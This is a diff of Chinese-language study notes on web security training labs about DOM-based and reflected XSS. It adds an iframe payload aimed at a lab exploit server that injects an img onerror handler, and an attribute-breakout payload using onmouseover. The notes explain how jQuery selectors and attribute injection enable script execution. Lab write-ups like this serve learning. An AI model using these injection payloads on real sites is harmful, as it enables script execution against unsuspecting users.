@@ -39,3 +39,13 @@ xxx" onload="alert(1)  \\构造前后闭合
 使用 :contains() 选择器并直接插入用户控制的内容（例如 URL 的哈希值）可能存在一定的安全风险，特别是 XSS（跨站脚本攻击）的风险。因此，在实际开发中，使用这类选择器时应注意对输入内容进行充分的验证和过滤，以防止恶意代码注入。
 
 在这个lab的关键点是，jquery的工作原理：无论是否有任何匹配项，他都会返回jquery的搜索对象
+payload
+```
+<iframe src="https://exploit-0ac6000704c9ae5b80ac431f01ad008b.exploit-server.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+
+## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
+```
+" onmouseover="alert(1)
+```
+该属性会在用户将鼠标移到输入框时触发 alert(1)，从而弹出一个 JavaScript 警告框。
